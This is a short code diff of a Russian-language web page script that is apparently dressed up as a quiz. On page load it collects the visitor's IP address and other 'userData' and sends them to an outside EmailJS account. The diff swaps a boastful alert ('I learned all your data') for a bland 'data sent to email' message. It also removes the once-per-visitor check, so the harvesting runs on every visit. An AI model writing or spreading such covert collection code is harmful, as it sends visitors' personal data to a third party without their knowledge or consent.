@@ -120,7 +120,7 @@
             emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                 .then(function(response) {
                     console.log("Данные успешно отправлены", response);
-                    alert('Пока ты все это читал я узнал все твои данные:)))))))');
+                    alert('Данные отправлены на почту!');
                     markIpAsSent(userData.ip);
                 }, function(error) {
                     console.error("Ошибка при отправке данных", error);
@@ -162,12 +162,6 @@
 
         // Инициализация сбора данных при загрузке страницы
         window.onload = function() {
-            const hasTakenTest = localStorage.getItem("hasTakenTest");
-            if (hasTakenTest) {
-                showResult();
-                return;
-            }
-
             getUserIP(function(ip) {
                 console.log("IP-адрес:", ip);
 
@@ -331,7 +325,6 @@
             }
             
             resultDiv.innerHTML = `Ответ: ${resultText}`;
-            localStorage.setItem("hasTakenTest", "true");
         }
     </script>
 </body>
